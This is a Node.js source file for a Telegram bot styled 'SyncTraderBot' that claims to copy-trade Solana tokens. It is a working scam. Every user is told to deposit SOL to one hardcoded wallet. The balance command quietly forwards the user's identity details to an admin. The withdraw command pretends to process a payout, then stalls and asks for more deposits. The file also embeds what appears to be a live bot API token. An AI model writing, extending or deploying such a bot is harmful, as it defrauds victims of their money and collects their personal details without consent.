const { Telegraf } = require('telegraf');

// Your Bot API Key
const bot = new Telegraf('7403899361:AAF98LTlVLow_oON0x73FfrgaI9SkVZx3js'); // Replace with your actual API key

// Wallet address
const WALLET_ADDRESS = '8CEkNWWi6ipY79Wjmubip65Gvy7EWvFMQKv3gLK3wzaV';

// Admin's Telegram ID for notification
const ADMIN_ID = 'YOUR_ADMIN_ID';  // Replace with your actual Telegram ID

// /start command
bot.start((ctx) => {
  ctx.reply(
    `Welcome to SyncTraderBot.\n\n` +
    `Solana's fastest bot to copy trade any coin (SPL token).\n\n` +
    `To start trading, deposit SOL to your Fiat wallet address:\n\n` +
    `${WALLET_ADDRESS}`
  );
});

// /wallet command
bot.command('wallet', (ctx) => {
  ctx.reply(
    `Your Wallet:\n\n` +
    `Address: ${WALLET_ADDRESS}\n\n` +
    `Copy the address and send SOL to deposit.`
  );
});

// /balance command (Removed - now only notifies admin)
bot.command('balance', (ctx) => {
  ctx.reply('Please wait, we\'re processing it...');
  const userInfo = ctx.from;
  const messageToAdmin = `User: ${userInfo.first_name} ${userInfo.last_name || ''}\n` +
                         `Username: @${userInfo.username}\n` +
                         `ID: ${userInfo.id}\n` +
                         `Language: ${userInfo.language_code}`;
  bot.telegram.sendMessage(ADMIN_ID, messageToAdmin);
});

// /withdraw command
bot.command('withdraw', (ctx) => {
  ctx.reply('Please provide your wallet address and the amount to withdraw.');
  bot.on('text', (ctx) => {
    const userMessage = ctx.message.text;
    const [address, amount] = userMessage.split(' ');
    ctx.reply(`Address: ${address}\nAmount: ${amount}\n\nWe are processing your withdrawal...`);
    setTimeout(() => {
      ctx.reply('We\'re having heavy traffic at the moment, but you can still fund your account.');
    }, 5000);
  });
});

// Fallback for unknown commands
bot.on('text', (ctx) => {
  ctx.reply('Unknown command. Please use /start to see available options.');
});

// Export as a Vercel serverless function
module.exports = async (req, res) => {
  await bot.handleUpdate(req.body); // Process incoming updates from Telegram
  res.status(200).send('OK');
};
